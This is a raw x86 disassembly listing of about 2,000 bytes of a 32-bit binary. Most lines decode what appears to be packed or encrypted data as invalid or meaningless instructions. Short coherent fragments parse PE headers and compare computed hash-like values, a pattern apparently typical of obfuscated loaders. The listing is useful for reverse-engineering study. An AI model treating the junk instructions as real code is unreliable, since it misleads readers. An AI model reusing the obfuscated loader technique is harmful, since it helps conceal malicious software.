  40c3e0:	into   
  40c3e1:	xchg   edx,eax
  40c3e2:	add    BYTE PTR [eax-0x32],dh
  40c3e5:	repnz aaa 
  40c3e7:	push   0x4f5ea7da
  40c3ec:	and    eax,0x9e7ee36f
  40c3f1:	ins    BYTE PTR es:[edi],dx
  40c3f2:	lods   al,BYTE PTR ds:[esi]
  40c3f3:	inc    esi
  40c3f4:	mov    dl,0x87
  40c3f6:	xlat   BYTE PTR ds:[ebx]
  40c3f7:	stos   DWORD PTR es:[edi],eax
  40c3f8:	mov    cl,0x33
  40c3fa:	or     BYTE PTR [ebx],ch
  40c3fc:	aas    
  40c3fd:	mov    cl,0xf0
  40c3ff:	rol    DWORD PTR [edx],1
  40c401:	pop    esp
  40c402:	cwde   
  40c403:	lahf   
  40c404:	ins    BYTE PTR es:[edi],dx
  40c405:	inc    eax
  40c406:	xchg   DWORD PTR [esp+ebx*8+0x174030b7],edi
  40c40d:	test   al,0x67
  40c40f:	test   BYTE PTR [ebx+0x20],al
  40c412:	dec    ebx
  40c413:	inc    edi
  40c414:	(bad)  
  40c415:	cld    
  40c416:	call   FWORD PTR [ecx]
  40c418:	add    ecx,DWORD PTR ds:0xa877609b
  40c41e:	cdq    
  40c41f:	sbb    al,BYTE PTR [ebx-0x23]
  40c422:	or     al,ch
  40c424:	cmc    
  40c425:	inc    edi
  40c426:	lds    eax,FWORD PTR [eax+esi*2-0x7472656d]
  40c42d:	jne    0x40c448
  40c42f:	mov    ebx,0x9d161de1
  40c434:	clc    
  40c435:	inc    ebx
  40c436:	retf   
  40c437:	aaa    
  40c438:	adc    edx,edi
  40c43a:	and    ecx,DWORD PTR [edx+edi*8]
  40c43d:	daa    
  40c43e:	std    
  40c43f:	lea    eax,[eax+ecx*1+0x32729b]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x51]
  40c49b:	sti    
  40c49c:	enter  0x1901,0x87
  40c4a0:	jle    0x40c520
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c4e1
  40c4a7:	xchg   esi,eax
  40c4a8:	xlat   BYTE PTR ds:[ebx]
  40c4a9:	dec    esp
  40c4ab:	loopne 0x40c4ea
  40c4ad:	ret    
  40c4ae:	or     BYTE PTR [edi],dl
  40c4b0:	in     eax,dx
  40c4b1:	xlat   BYTE PTR ds:[ebx]
  40c4b2:	pop    edx
  40c4b3:	rol    ch,cl
  40c4b5:	frstor [edi+0x1d864f25]
  40c4bb:	daa    
  40c4bc:	and    eax,eax
  40c4be:	pop    ds
  40c4bf:	retf   
  40c4c0:	mov    ds:0xc0b1a570,al
  40c4c5:	mov    ch,0xf3
  40c4c7:	fnstsw WORD PTR [esi]
  40c4c9:	add    ch,0x24
  40c4cc:	mov    al,ds:0x116b0d48
  40c4d1:	push   ds
  40c4d2:	xor    esp,DWORD PTR [edx-0x1b]
  40c4d5:	nop
  40c4d6:	mul    ah
  40c4d8:	ja     0x40c513
  40c4da:	pushf  
  40c4db:	es push edx
  40c4dd:	xchg   ebx,eax
  40c4de:	or     edx,DWORD PTR [ebx+0x6d]
  40c4e1:	sub    esi,DWORD PTR [ecx+0x76]
  40c4e4:	std    
  40c4e5:	mov    eax,ds:0x285efaef
  40c4ea:	ss (bad) 
  40c4ec:	or     dh,ch
  40c4ee:	into   
  40c4ef:	aaa    
  40c4f0:	shl    BYTE PTR [ebx],0xaf
  40c4f3:	iret   
  40c4f4:	call   0x113ebc1
  40c4f9:	int    0x93
  40c4fb:	popf   
  40c4fc:	push   esi
  40c4fd:	and    DWORD PTR [eax-0x3a894285],ebx
  40c503:	mov    ecx,0xaf1af6a5
  40c508:	pop    es
  40c509:	and    esi,DWORD PTR [ebp+0x11]
  40c50c:	loop   0x40c556
  40c50e:	adc    edx,DWORD PTR [esi]
  40c510:	sbb    al,0x4f
  40c512:	mov    esi,0x3da9ae83
  40c517:	adc    al,0xb5
  40c519:	aam    0x83
  40c51b:	xchg   edi,eax
  40c51c:	outs   dx,BYTE PTR ds:[esi]
  40c51d:	xchg   ecx,eax
  40c51e:	xor    al,0xee
  40c520:	xor    dl,bh
  40c522:	inc    ecx
  40c523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c524:	and    eax,0x584d3d30
  40c529:	ficomp DWORD PTR es:[ecx+0x10]
  40c52d:	ins    DWORD PTR es:[edi],dx
  40c52e:	inc    esi
  40c52f:	mov    al,0x9b
  40c531:	sub    eax,DWORD PTR [esi+0x484e60f9]
  40c537:	mov    ah,0x51
  40c539:	add    ecx,DWORD PTR [eax-0x66]
  40c53c:	sbb    al,0x98
  40c53e:	ss xchg edx,edi
  40c541:	bound  edx,QWORD PTR [ebp+ebp*8-0x73]
  40c545:	daa    
  40c546:	fs xchg esi,eax
  40c548:	push   esi
  40c549:	ret    0x6e2e
  40c54c:	push   eax
  40c54d:	adc    dl,BYTE PTR [esi]
  40c54f:	fisttp QWORD PTR [eax-0x56efd741]
  40c555:	push   ebp
  40c556:	scas   al,BYTE PTR es:[edi]
  40c557:	lea    esi,[ebx]
  40c559:	loop   0x40c510
  40c55b:	js     0x40c5bf
  40c55d:	or     al,0x26
  40c55f:	test   eax,0x373547a6
  40c564:	sbb    al,0x9b
  40c566:	(bad)  
  40c567:	xchg   esp,eax
  40c568:	pushf  
  40c569:	div    BYTE PTR [eax-0x72]
  40c56c:	add    eax,0xc6a4ca32
  40c571:	clc    
  40c572:	and    BYTE PTR [edi+0x6bc4dbfa],cl
  40c578:	pop    esi
  40c579:	cmp    eax,0x61bfae51
  40c57e:	inc    esp
  40c57f:	push   es
  40c580:	mov    dl,0x39
  40c582:	mov    ecx,0xae6023ca
  40c587:	fstp   QWORD PTR [edx+0x78e5d5aa]
  40c58d:	and    al,0xb2
  40c58f:	xchg   ecx,eax
  40c590:	fisubr DWORD PTR [edi]
  40c592:	repz push edi
  40c594:	ror    DWORD PTR [edi-0x24678804],1
  40c59a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c59b:	push   ebx
  40c59c:	cmc    
  40c59d:	in     eax,0x0
  40c59f:	fcmovb st,st(3)
  40c5a1:	rcr    al,0x32
  40c5a4:	out    dx,al
  40c5a5:	and    al,0x44
  40c5a7:	mov    esp,0xd669c7e5
  40c5ac:	inc    edi
  40c5ad:	dec    ebx
  40c5ae:	pop    esi
  40c5af:	sti    
  40c5b0:	sub    DWORD PTR ds:0x2194b63c,esi
  40c5b6:	xchg   ebp,eax
  40c5b7:	sahf   
  40c5b8:	gs std 
  40c5ba:	sub    al,BYTE PTR ds:0xf19cf1ff
  40c5c0:	xchg   esp,eax
  40c5c1:	jle    0x40c5a4
  40c5c3:	cmp    bl,BYTE PTR [eax-0x41]
  40c5c6:	lahf   
  40c5c7:	ror    BYTE PTR [edx],cl
  40c5c9:	xlat   BYTE PTR ds:[ebx]
  40c5ca:	and    bh,BYTE PTR [esi+0x76]
  40c5cd:	aad    0x38
  40c5cf:	icebp  
  40c5d0:	add    DWORD PTR [edi-0x37],0x39
  40c5d4:	xchg   ebx,eax
  40c5d5:	cwde   
  40c5d6:	out    0xc5,al
  40c5d8:	xlat   BYTE PTR ds:[ebx]
  40c5d9:	mov    ?,WORD PTR [edx]
  40c5db:	shl    BYTE PTR [edx-0x71],1
  40c5de:	pop    esp
  40c5df:	jbe    0x40c609
  40c5e1:	mov    ah,0x35
  40c5e3:	outs   dx,DWORD PTR ds:[esi]
  40c5e4:	test   eax,0xb7d69465
  40c5e9:	jp     0x40c57b
  40c5eb:	test   BYTE PTR [esp+esi*8],0x48
  40c5ef:	cmp    cl,cl
  40c5f1:	fnstcw WORD PTR [ebx+0x6e24bc1b]
  40c5f7:	pop    ebx
  40c5f8:	popa   
  40c5f9:	pop    edi
  40c5fa:	pop    ebp
  40c5fb:	dec    eax
  40c5fc:	xor    DWORD PTR [ebp+0x3d],ebx
  40c5ff:	imul   ebp,DWORD PTR [ebp+ebp*8+0x2f55c08c],0xffffffb0
  40c607:	out    0x87,eax
  40c609:	sti    
  40c60a:	and    al,0xfb
  40c60c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c60d:	std    
  40c60e:	and    ebp,DWORD PTR [ebp+0x5c]
  40c611:	xchg   ecx,eax
  40c612:	and    BYTE PTR [eax],dl
  40c614:	sub    eax,DWORD PTR [ecx+0x5152400b]
  40c61a:	fdiv   DWORD PTR [edx+0x10e5e1bd]
  40c620:	cld    
  40c621:	add    BYTE PTR [ebp-0x46348f24],dh
  40c627:	add    ebp,DWORD PTR [eax]
  40c629:	call   0x19:0x524d121b
  40c630:	sbb    dh,BYTE PTR [ebx]
  40c632:	shl    BYTE PTR [edi-0x7d],cl
  40c635:	shl    edi,0xd2
  40c638:	iret   
  40c639:	inc    ecx
  40c63a:	pop    edx
  40c63b:	dec    edx
  40c63c:	adc    dh,ah
  40c63e:	je     0x40c646
  40c640:	mov    dh,0x53
  40c642:	jmp    0x40c649
  40c644:	jg     0x40c694
  40c646:	xor    eax,0x43a84f21
  40c64b:	xor    DWORD PTR [ebp+0x7757fb42],esp
  40c651:	mov    bh,0x48
  40c653:	popa   
  40c654:	mov    dh,0xf1
  40c656:	add    al,0x6c
  40c658:	fwait
  40c659:	xchg   DWORD PTR [edi],edx
  40c65b:	xchg   ebx,eax
  40c65c:	inc    edx
  40c65d:	or     BYTE PTR [eax-0x6],0x4e
  40c661:	sbb    ecx,DWORD PTR [ecx]
  40c663:	adc    al,0xaa
  40c665:	push   0xffffffe1
  40c667:	jo     0x40c6c5
  40c669:	out    0xc7,eax
  40c66b:	mov    eax,0x49609ba2
  40c670:	rcl    al,0xd4
  40c673:	push   ss
  40c674:	push   ebx
  40c675:	push   esi
  40c676:	fistp  QWORD PTR ds:0xbfe7ca2d
  40c67c:	inc    ebx
  40c67d:	add    DWORD PTR [ebp-0x57],edi
  40c680:	jmp    FWORD PTR [esi-0x4c]
  40c683:	ins    DWORD PTR es:[edi],dx
  40c684:	mov    dh,0xb7
  40c686:	sar    BYTE PTR [edi-0x65],0xc3
  40c68a:	sub    edi,ebx
  40c68c:	aam    0x55
  40c68e:	sub    al,0x4d
  40c690:	stos   DWORD PTR es:[edi],eax
  40c691:	push   ebx
  40c692:	push   ds
  40c693:	lahf   
  40c694:	add    ch,BYTE PTR [esi]
  40c696:	ds adc al,0xa5
  40c699:	push   cs
  40c69a:	push   edx
  40c69b:	inc    edi
  40c69c:	cmp    bl,BYTE PTR [edi]
  40c69e:	mov    eax,0x22967e1a
  40c6a3:	in     al,dx
  40c6a4:	test   al,0xc1
  40c6a6:	rol    DWORD PTR [esi],cl
  40c6a8:	fimul  DWORD PTR [ebx+0x30]
  40c6ab:	jg     0x40c6a4
  40c6ad:	mov    ebp,0x59e0c117
  40c6b2:	and    eax,0xde6facb1
  40c6b7:	std    
  40c6b8:	out    dx,eax
  40c6b9:	sar    DWORD PTR [ebx],0x16
  40c6bc:	clc    
  40c6bd:	pop    ebp
  40c6be:	stos   BYTE PTR es:[edi],al
  40c6bf:	mov    ebx,0xbca72657
  40c6c4:	pop    ds
  40c6c5:	mov    edx,0xfe4f85e6
  40c6ca:	dec    ebp
  40c6cb:	dec    esp
  40c6cc:	outs   dx,DWORD PTR ds:[esi]
  40c6cd:	retf   0xb960
  40c6d0:	scas   al,BYTE PTR es:[edi]
  40c6d1:	ins    DWORD PTR es:[edi],dx
  40c6d2:	dec    ebx
  40c6d3:	aaa    
  40c6d4:	xor    dh,al
  40c6d6:	push   ebx
  40c6d7:	mov    edi,0x2751984d
  40c6dc:	dec    esp
  40c6dd:	xchg   ebx,eax
  40c6de:	mov    dh,0xae
  40c6e0:	es test dh,ah
  40c6e3:	pop    es
  40c6e4:	sbb    edx,DWORD PTR es:[esi+0x6b]
  40c6e8:	mov    edi,gs
  40c6ea:	bound  ecx,QWORD PTR [ebx+0x50]
  40c6ed:	mov    dl,0x5f
  40c6ef:	inc    eax
  40c6f0:	jno    0x40c734
  40c6f2:	lock aaa 
  40c6f4:	and    DWORD PTR [edi],ebp
  40c6f6:	int    0x24
  40c6f8:	sbb    al,BYTE PTR [edx+0x305a1d43]
  40c6fe:	sbb    eax,0x6f5222f1
  40c703:	rsm    
  40c705:	test   eax,0x83db0adb
  40c70a:	ja     0x40c743
  40c70c:	out    0x2e,al
  40c70e:	clc    
  40c70f:	xchg   edi,eax
  40c710:	push   eax
  40c711:	add    eax,eax
  40c713:	(bad)  
  40c714:	out    dx,eax
  40c715:	push   0x4dbce48c
  40c71a:	jl     0x40c790
  40c71c:	mov    ds:0x1aa7db1d,al
  40c721:	mov    esp,0xf1219734
  40c726:	retf   0xe3ee
  40c729:	retf   0x52a8
  40c72c:	or     DWORD PTR [eax+0x45ac3d2f],edx
  40c732:	mov    ebx,0x2e730e1e
  40c737:	test   BYTE PTR [edx+0x1a],ch
  40c73a:	or     BYTE PTR [esi],0xc2
  40c73d:	jg     0x40c6e7
  40c73f:	add    ch,BYTE PTR [esi+0x6f]
  40c742:	enter  0xf1fb,0x26
  40c746:	adc    dh,BYTE PTR [ecx-0x38e14874]
  40c74c:	outs   dx,DWORD PTR ds:[esi]
  40c74d:	mov    esi,0x7ef7afbf
  40c752:	imul   esp,DWORD PTR [edx+0x6d735f93],0x9193611e
  40c75c:	retf   
  40c75d:	gs cmc 
  40c75f:	(bad)  [ebp+0xc37b73d]
  40c765:	lahf   
  40c766:	gs push ds
  40c768:	outs   dx,DWORD PTR ds:[esi]
  40c769:	jge    0x40c747
  40c76b:	mov    edx,0xdfc1838a
  40c770:	dec    eax
  40c771:	sar    cl,1
  40c773:	xchg   esi,eax
  40c774:	loopne 0x40c7d3
  40c776:	pushf  
  40c777:	addr16 sub al,0x28
  40c77a:	cdq    
  40c77b:	nop
  40c77c:	mov    bh,0x6e
  40c77e:	pusha  
  40c77f:	repnz neg BYTE PTR [ecx-0x4b]
  40c783:	int    0xc3
  40c785:	add    eax,0xb99bb81f
  40c78a:	push   0x7664ef7e
  40c78f:	dec    edi
  40c790:	out    dx,al
  40c791:	xchg   esi,eax
  40c792:	fistp  DWORD PTR [ebp+0x34]
  40c795:	inc    ebp
  40c796:	cmp    eax,0x6c594f8
  40c79b:	xchg   DWORD PTR [esp+ebp*4-0xd],esp
  40c79f:	pop    ebp
  40c7a0:	or     al,0xef
  40c7a2:	mov    ecx,0xbb559ab4
  40c7a7:	pusha  
  40c7a8:	cmp    DWORD PTR [ebx+0x2c],esp
  40c7ab:	push   0x4e2f8d4e
  40c7b0:	push   0x8184a6e0
  40c7b5:	jns    0x40c7cd
  40c7b7:	outs   dx,DWORD PTR ds:[esi]
  40c7b8:	push   ss
  40c7b9:	push   eax
  40c7ba:	mov    dl,0x6d
  40c7bc:	arpl   di,di
  40c7be:	arpl   di,bp
  40c7c0:	sub    ebx,esp
  40c7c2:	jmp    0x7436:0xc1a2e287
  40c7c9:	dec    ecx
  40c7ca:	enter  0xa90d,0xb8
  40c7ce:	adc    al,0x2b
  40c7d0:	in     al,dx
  40c7d1:	fnstsw WORD PTR [edi-0x746a487f]
  40c7d7:	dec    ebp
  40c7d8:	clc    
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	jg     0x40c870
  40c801:	fisttp WORD PTR [edi+0x7e7e82c9]
  40c807:	cs jge 0x40c888
  40c80a:	jle    0x40c78f
  40c80c:	mov    ah,0x60
  40c80e:	adc    dh,BYTE PTR [eax-0x21a499fc]
  40c814:	call   0x7edaa52b
  40c819:	leave  
  40c81a:	or     BYTE PTR [ebx+0x3b],cl
  40c81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c81e:	dec    esi
  40c81f:	adc    bh,BYTE PTR [ebp-0x77]
  40c822:	mov    al,0xa7
  40c824:	repnz pop ebp
  40c826:	(bad)  [ecx]
  40c828:	lahf   
  40c829:	push   esi
  40c82a:	pusha  
  40c82b:	add    BYTE PTR [ebp-0x80],0x48
  40c82f:	mov    ebp,0x8af3b3b7
  40c834:	mov    ss,WORD PTR [esi+ebx*4+0x19]
  40c838:	jge    0x40c843
  40c83a:	sub    eax,0x5694174c
  40c83f:	mov    bl,0xdd
  40c841:	pop    sp
  40c843:	push   es
  40c844:	repnz and bl,dh
  40c847:	push   esp
  40c848:	cmp    DWORD PTR gs:0xf667b154,ebp
  40c84f:	push   DWORD PTR ds:0x91b3342f
  40c855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c856:	push   eax
  40c857:	sbb    al,0x76
  40c859:	mov    bh,0xa2
  40c85b:	jmp    0x40c894
  40c85d:	mov    ch,0x6d
  40c85f:	add    ch,al
  40c861:	int    0x81
  40c863:	add    al,0xfb
  40c865:	loop   0x40c82c
  40c867:	out    dx,eax
  40c868:	je     0x40c8e0
  40c86a:	mov    cl,0xb6
  40c86c:	mov    edi,esi
  40c86e:	sar    cl,cl
  40c870:	jg     0x40c803
  40c872:	mov    WORD PTR [eax-0x78],fs
  40c875:	scas   al,BYTE PTR es:[edi]
  40c876:	aas    
  40c877:	ins    DWORD PTR es:[edi],dx
  40c878:	test   edi,ebp
  40c87a:	jbe    0x40c891
  40c87c:	mov    dh,0x30
  40c87e:	rcl    DWORD PTR [ebx+0x78],1
  40c881:	mov    ah,dh
  40c883:	(bad)
  40c886:	dec    ebx
  40c887:	mov    ds,WORD PTR [ebx+0x4c]
  40c88a:	xor    al,BYTE PTR [edi+0x4e2e7a7a]
  40c890:	call   0xe7cd:0xa1928df8
  40c897:	inc    esp
  40c898:	(bad)  
  40c89a:	xchg   esi,eax
  40c89b:	fldenv ds:0xd6d05bca
  40c8a1:	in     eax,dx
  40c8a2:	mov    ebp,DWORD PTR [ebx-0x6b]
  40c8a5:	jg     0x40c8fb
  40c8a7:	xor    al,0x9a
  40c8a9:	pop    ebx
  40c8aa:	mov    esp,0xf04cd4ac
  40c8af:	(bad)  
  40c8b0:	xchg   esp,eax
  40c8b1:	mov    edx,0xf0c44884
  40c8b6:	cli    
  40c8b7:	arpl   WORD PTR [esi+ecx*8],si
  40c8ba:	jae    0x40c896
  40c8bc:	rol    DWORD PTR [ecx+0x4f],cl
  40c8bf:	mov    ebp,0x77734c7
  40c8c4:	popa   
  40c8c5:	sub    BYTE PTR [edi+0xc],bh
  40c8c8:	and    eax,0xffffff8a
  40c8cb:	arpl   WORD PTR [edx],cx
  40c8cd:	or     esi,DWORD PTR [ecx]
  40c8cf:	and    BYTE PTR [edx-0x77],bh
  40c8d2:	std    
  40c8d3:	pop    esp
  40c8d4:	push   esi
  40c8d5:	pusha  
  40c8d6:	cs jb  0x40c87c
  40c8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8da:	std    
  40c8db:	or     al,0xcb
  40c8dd:	ds and dh,ah
  40c8e0:	inc    ebx
  40c8e1:	fs jb  0x40c8e5
  40c8e4:	into   
  40c8e5:	imul   ecx
  40c8e7:	add    al,0x4b
  40c8e9:	dec    esi
  40c8ea:	dec    edx
  40c8eb:	push   edi
  40c8ec:	mov    bh,0xd7
  40c8ee:	into   
  40c8ef:	outs   dx,BYTE PTR ds:[esi]
  40c8f0:	and    DWORD PTR [ebx+0x78d7a329],esp
  40c8f6:	dec    edi
  40c8f7:	add    al,0xfb
  40c8f9:	test   al,0xf9
  40c8fb:	pop    es
  40c8fc:	mov    bh,0x0
  40c8fe:	fmul   DWORD PTR [edi+0x4efb1ff9]
  40c904:	aam    0x14
  40c906:	mov    al,ds:0xe8f033cd
  40c90b:	(bad)  
  40c90c:	mov    edi,0x65d98b23
  40c911:	rol    esp,cl
  40c913:	jmp    0x40c980
  40c915:	mov    edi,0xc537003f
  40c91a:	dec    edi
  40c91b:	loope  0x40c8d8
  40c91d:	cwde   
  40c91e:	adc    eax,0x622c73ac
  40c923:	xchg   ebp,eax
  40c924:	push   eax
  40c925:	sar    DWORD PTR fs:[edx],0xd7
  40c929:	stos   BYTE PTR es:[edi],al
  40c92a:	call   0xc4e1dc9c
  40c92f:	xor    BYTE PTR [esi-0x35ab2836],ah
  40c935:	ja     0x40c9a5
  40c937:	sub    edi,DWORD PTR [ebp-0xbc1fcc2]
  40c93d:	fild   QWORD PTR [esi+0xc]
  40c940:	or     al,0x2e
  40c942:	mov    ecx,0x6ec68668
  40c947:	loope  0x40c948
  40c949:	outs   dx,BYTE PTR ds:[esi]
  40c94a:	cmp    al,BYTE PTR [edi+ebp*4-0x670f5b71]
  40c951:	repnz mov BYTE PTR [eax+ebx*4-0x6f],cl
  40c956:	iret   
  40c957:	je     0x40c9c3
  40c959:	or     ah,BYTE PTR [esi-0x3ebe5691]
  40c95f:	test   cl,dh
  40c961:	xchg   ecx,eax
  40c962:	push   esp
  40c963:	sbb    ah,bh
  40c965:	jp     0x40c9cb
  40c967:	xor    al,0x81
  40c969:	dec    BYTE PTR [edi]
  40c96b:	test   BYTE PTR [eax],ch
  40c96d:	dec    edi
  40c96e:	mov    DWORD PTR [edx+0xe],0xb167721d
  40c975:	or     al,0x9c
  40c977:	fiadd  DWORD PTR [edi]
  40c979:	(bad)  [ecx]
  40c97b:	mov    eax,ds:0x9170d384
  40c980:	sti    
  40c981:	sub    BYTE PTR [esi+0x2d6ac54d],0x8d
  40c988:	xor    eax,0x5638f9f0
  40c98d:	aam    0x7b
  40c98f:	pop    ds
  40c990:	jmp    0xfc4c:0x35bf543d
  40c997:	mov    fs:0x199d3975,al
  40c99d:	stos   BYTE PTR es:[edi],al
  40c99e:	cwde   
  40c99f:	sar    bh,cl
  40c9a1:	call   0x1bf9:0x8451a73e
  40c9a8:	mov    ds:0x59cf5a7d,al
  40c9ad:	inc    eax
  40c9ae:	lock js 0x40c98c
  40c9b1:	and    ebx,DWORD PTR [eax+0x62777ad1]
  40c9b7:	push   cs
  40c9b8:	push   0xffffffb9
  40c9ba:	adc    BYTE PTR [edi-0x74a37329],dh
  40c9c0:	ror    BYTE PTR [edx-0x73],1
  40c9c3:	mov    bl,0x86
  40c9c5:	mov    cl,0xe
  40c9c7:	jmp    0x959edc22
  40c9cc:	xor    BYTE PTR [ebp+0x14],0x1a
  40c9d0:	cld    
  40c9d1:	stos   BYTE PTR es:[edi],al
  40c9d2:	add    BYTE PTR [ebp+0x1de64246],dh
  40c9d8:	ds or  cl,al
  40c9db:	jbe    0x40ca3f
  40c9dd:	bound  ecx,QWORD PTR [esi]
  40c9df:	bound  eax,QWORD PTR [eax+0x59]
  40c9e2:	jae    0x40c9f0
  40c9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e5:	in     al,dx
  40c9e6:	mov    bl,0xa4
  40c9e8:	repz mov ah,0x53
  40c9eb:	push   0xec387c52
  40c9f0:	fxch   st(7)
  40c9f2:	mov    bh,0x49
  40c9f4:	or     eax,DWORD PTR [ecx+0x6870343f]
  40c9fa:	out    dx,al
  40c9fb:	imul   eax,eax,0xd6fcf430
  40ca01:	jg     0x40c9fc
  40ca03:	adc    bl,dh
  40ca05:	imul   ebx,DWORD PTR [edx+0x2c],0xffffffc0
  40ca09:	and    al,0xec
  40ca0b:	shr    BYTE PTR [edx-0x6d08d624],1
  40ca11:	cmp    DWORD PTR [ecx+0x5c3f893a],0x69
  40ca18:	push   eax
  40ca19:	push   ss
  40ca1a:	das    
  40ca1b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1d:	xor    ch,BYTE PTR [ebp-0x6b]
  40ca20:	sub    ch,BYTE PTR [ecx+edi*8-0x8]
  40ca24:	jge    0x40ca13
  40ca26:	add    eax,0x7c4bc408
  40ca2b:	inc    esi
  40ca2c:	cs and esp,esi
  40ca2f:	pop    edx
  40ca30:	ds test DWORD PTR ds:0x942443bd,eax
  40ca38:	in     al,0xa
  40ca3a:	(bad)  
  40ca3b:	mov    bh,0x8c
  40ca3d:	cmp    eax,0x6e46e0d6
  40ca42:	lds    edi,FWORD PTR [esp+0x1aceab55]
  40ca49:	aaa    
  40ca4a:	jbe    0x40ca5d
  40ca4c:	les    ebp,FWORD PTR [ebp+0x3d49a1c9]
  40ca52:	push   esi
  40ca53:	mov    bl,0x5a
  40ca55:	push   esi
  40ca56:	lock inc esi
  40ca58:	cwde   
  40ca59:	repnz cmp eax,0x9c69e6bc
  40ca5f:	rcr    DWORD PTR [edx-0x42f4e917],1
  40ca65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca66:	fimul  WORD PTR [ecx]
  40ca68:	dec    DWORD PTR [ecx+0x6c]
  40ca6b:	fs ret 
  40ca6d:	sub    al,0x6f
  40ca6f:	pop    ss
  40ca70:	loope  0x40ca30
  40ca72:	mov    WORD PTR [ecx-0xf65ebdc],ss
  40ca78:	not    DWORD PTR [ecx+0x23d9cf02]
  40ca7e:	mov    WORD PTR [ecx-0x49],ds
  40ca81:	push   ebx
  40ca82:	repnz clc 
  40ca84:	nop
  40ca85:	out    0x90,al
  40ca87:	sbb    al,0xe
  40ca89:	cmp    cl,BYTE PTR [ebp-0x485eba04]
  40ca8f:	test   bl,ah
  40ca91:	loope  0x40ca90
  40ca93:	enter  0xfbc9,0xfd
  40ca97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca98:	sbb    al,BYTE PTR [edi+edx*2-0x29f51479]
  40ca9f:	mov    ch,0x7b
  40caa1:	sub    al,0x54
  40caa3:	out    0x57,eax
  40caa5:	dec    esi
  40caa6:	cmp    al,0xc9
  40caa8:	sub    edx,DWORD PTR [ecx-0x46]
  40caab:	xchg   ecx,eax
  40caac:	inc    edi
  40caad:	int    0x12
  40caaf:	xor    eax,0x89d4bf31
  40cab4:	xchg   ebp,edi
  40cab6:	jmp    0x9085:0x18629e1a
  40cabd:	mov    ds:0xd327a4aa,eax
  40cac2:	push   ds
  40cac3:	int3   
  40cac4:	xlat   BYTE PTR ds:[ebx]
  40cac5:	sti    
  40cac6:	and    eax,0x5cf65048
  40cacb:	inc    edi
  40cacc:	push   ebp
  40cacd:	add    ebp,0xffffff82
  40cad0:	in     al,0x9e
  40cad2:	xor    al,0x81
  40cad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad5:	outs   dx,DWORD PTR ds:[esi]
  40cad6:	mov    ah,0x69
  40cad8:	mov    ds:0x224afa76,al
  40cadd:	(bad)  
  40cade:	and    eax,0xed49bf0
  40cae3:	mov    ch,0xe4
  40cae5:	mov    esp,?
  40cae7:	xchg   esi,eax
  40cae8:	mov    ah,BYTE PTR [ecx]
  40caea:	clc    
  40caeb:	lock and ebx,ecx
  40caee:	(bad)  
  40caef:	xor    al,0xcf
  40caf1:	mov    al,0x7a
  40caf3:	mov    ch,0x43
  40caf5:	push   es
  40caf6:	ins    DWORD PTR es:[edi],dx
  40caf7:	test   al,0x7b
  40caf9:	(bad)  
  40cafa:	sub    bh,dh
  40cafc:	sub    al,0xbd
  40cafe:	pop    eax
  40caff:	pop    esi
  40cb00:	test   al,0xb6
  40cb02:	mov    esp,0x8dc2f341
  40cb07:	scas   eax,DWORD PTR es:[edi]
  40cb08:	call   0xfbef:0xdddb3174
  40cb0f:	int    0xad
  40cb11:	push   esi
  40cb12:	xchg   edx,eax
  40cb13:	jg     0x40cab4
  40cb15:	fidivr DWORD PTR [esi+esi*2+0xc]
  40cb19:	mov    dh,BYTE PTR [ebx-0x32]
  40cb1c:	xchg   edx,eax
  40cb1d:	jmp    0x40cadc
  40cb1f:	xor    ah,BYTE PTR [ebp+ebp*8-0x15]
  40cb23:	and    al,0x2c
  40cb25:	mov    esp,0x6a5c97fa
  40cb2a:	cmp    al,0xac
  40cb2c:	(bad)  
  40cb2e:	dec    ebx
  40cb2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb30:	inc    edx
  40cb31:	and    BYTE PTR [ecx],dl
  40cb33:	das    
  40cb34:	jbe    0x40cb96
  40cb36:	sub    dh,BYTE PTR [esi+0x38]
  40cb39:	(bad)  
  40cb3a:	cmp    al,0x8b
  40cb3c:	dec    ebp
  40cb3d:	loopne 0x40cb72
  40cb3f:	mov    BYTE PTR [ebx],0xc7
  40cb42:	cmp    ecx,eax
